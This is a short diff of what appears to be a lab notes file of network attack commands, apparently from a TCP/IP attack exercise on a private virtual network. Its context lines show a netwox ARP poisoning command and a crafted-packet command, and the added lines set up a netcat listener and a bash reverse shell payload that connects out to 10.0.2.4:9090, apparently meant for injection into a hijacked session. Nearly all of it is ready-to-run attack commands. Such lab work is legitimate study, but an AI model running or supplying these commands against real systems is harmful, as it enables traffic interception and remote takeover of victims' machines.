@@ -11,3 +11,7 @@ sudo netwox 40 --ip4-dontfrag --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 -
 
 # ARP poisoning
 sudo netwox 33 -d eth2 -a 08:00:27:d3:db:4f -b 08:00:27:f9:fc:b9 -c 2054 -e 2 -f 08:00:27:d3:db:4f -g 10.0.2.1 -h 08:00:27:d3:db:4f -i 10.0.2.5
+
+#reverse shell
+nc -l 9090 -v
+“‘/bin/bash -i > /dev/tcp/10.0.2.4/9090 0<&1 2>&1’0d0a”
